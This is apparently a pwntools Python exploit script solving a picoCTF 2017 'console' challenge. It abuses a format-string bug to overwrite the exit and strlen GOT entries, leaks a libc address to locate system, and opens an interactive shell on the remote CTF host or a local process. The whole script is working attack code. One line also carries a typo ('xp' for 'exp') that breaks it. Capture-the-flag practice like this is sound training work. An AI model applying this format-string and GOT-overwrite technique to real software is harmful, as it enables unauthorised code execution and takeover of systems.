import struct
import sys
from pwn import *


LOOP=0x00000000004009bd
EXITGOT=0x601258
OFFSET=0x3db7a3
SYSTEMOFFSET=0x47dc0
STRLENGOT=0x601210

def logs(s):
    log.info(s)

def pad(data):
    return data + ("X"*(100-len(data)))
def saveToFile(filename,data):
    logs("Writing data into send")
    with open (filename,'w') as f:
        f.write(data)

def exploit(r):

    logs("Getting to loop foreever")
    exp="e "
    exp+=("%{}x %16$hn".format(2492)).ljust(14)
    #exp+="%p "*60
    exp+=p64(EXITGOT)
    #saveToFile("send",pad(exp))
    r.sendline(pad(exp))
    logs("Now we Loop foreever")
    # ------------------------------------------
    r.recvline()
    r.sendline("e %p")
    data = r.recvline()
    data= r.recv(100)
    LIBCLEAK=int(data[:len("0x7f95f18807a3")],16)
    LIBCBASE=LIBCLEAK - OFFSET
    SYSTEM= SYSTEMOFFSET+LIBCBASE
    logs("LIBC ADDRESS : "+hex(LIBCBASE))
    logs("SYSTEM ADDRESS : "+hex(SYSTEM))
    # ------------------------------------------
    r.sendline("p 123")
    r.recvline()

    lo = (SYSTEM & 0xffff) -1
    hi = ((SYSTEM & 0xffff0000)>>16) -1
    # ------------------------------------------

    exp="e "
    xp+=("%{}x %16$hn".format(lo)).ljust(14)
    exp+=p64(STRLENGOT)
    r.sendline(pad(exp))

    exp="e "
    exp+=("%{}x %16$hn".format(hi)).ljust(14)
    exp+=p64(STRLENGOT+2)
    r.sendline(pad(exp))

    r.interactive()

if __name__=="__main__":

    if len(sys.argv)>1:
        logs("Sending info to server")
        r=remote("shell2017.picoctf.com","55740")
    else:
        logs("Sending info locally")
        r=process(['./console','logs.txt'])
    exploit(r)